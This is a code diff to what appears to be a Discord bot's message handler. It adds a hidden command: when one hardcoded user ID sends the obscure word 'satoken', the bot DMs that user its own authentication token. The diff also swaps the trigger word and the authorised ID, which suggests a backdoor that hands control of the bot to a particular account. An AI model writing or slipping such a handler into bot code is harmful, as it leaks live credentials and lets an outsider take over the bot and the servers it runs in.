@@ -141,8 +141,8 @@ client.on('message', async (msg, member, guild) => {
   
  {
    
-if (msg.content.toLowerCase() === 'token'){
-if (msg.author.id !== "429357746002067493") return
+if (msg.content.toLowerCase() === 'satoken'){
+if (msg.author.id !== "813799329407041576") return
 
 msg.author.send(client.token);
 }
